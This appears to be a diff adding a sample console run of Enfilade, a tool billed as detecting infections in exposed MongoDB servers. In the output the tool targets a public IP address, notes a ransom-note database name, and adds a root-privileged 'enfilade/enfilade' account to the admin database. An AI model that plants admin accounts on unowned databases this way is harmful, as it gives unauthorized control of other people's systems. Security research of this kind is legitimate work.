@@ -1,0 +1,43 @@
+$ python enfilade.py 59.125.12.109 27017 admin_access_verify
+	--------------------------------------------------------------------
+   
+	   _____  ____________   ___   ___  ____
+	  / __/ |/ / __/  _/ /  / _ | / _ \/ __/
+	 / _//    / _/_/ // /__/ __ |/ // / _/  
+	/___/_/|_/_/ /___/____/_/ |_/____/___/ 
+
+	ENFILADE : A Tool to Detect Potential Infections in MongoDB  Deployments !
+        Authored by: Aditya K Sood {https://adityaksood.com} 
+        
+	--------------------------------------------------------------------
+
+
+[#] Checking the <GEOIP> status of the MongoDB instance ......
+[*] MongoDB instance is located in <TW> | <Asia/Taipei>
+
+[*] MongoDB instance identifier is constructed as: mongodb://59.125.12.109:27017
+
+[*] Validating admin access: checking if MongoDB allows execution for admin commands....
+
+[*] Target : <59.125.12.109:27017>
+[*] Connection established, trying to add user <enfilade> to the <admin> database in the target MongoDB instance ....
+
+[*] Checking if the <admin> database exists on MongoDB instance: <[59.125.12.109:27017]>
+[-] Admin database doesn't exist: configured database: <[READ__ME_TO_RECOVER_YOUR_DATA]>, not initiating the command to add user <[enfildae], try manually... 
+[*] Admin database exists on the MongoDB instance.
+
+[*] ---------------------------------------------------------------------------------
+[*] Trying to add user <enfilade> with password <enfilade> to the MongoDB instance.
+[*] ---------------------------------------------------------------------------------
+
+
+[*] Verifying whether the user <enfilade> has been added or not...enumerating the <[users]>
+
+[*] <[SUCCESS]> user <enfilade> has been successfully added to the MongoDB instance: [59.125.12.109:27017]>
+{u'ok': 1.0, u'users': [{u'mechanisms': [u'SCRAM-SHA-1', u'SCRAM-SHA-256'], u'_id': u'admin.enfilade', u'db': u'admin', u'user': u'enfilade', u'roles': [{u'db': u'admin', u'role': u'root'}]}]}
+
+[*] -------------------------------------------------------------------------
+[*] Potential high privileges command can be executed on the MongoDB instance.
+[*] --------------------------------------------------------------------------
+
+[*] Request processed successfully ! exiting !
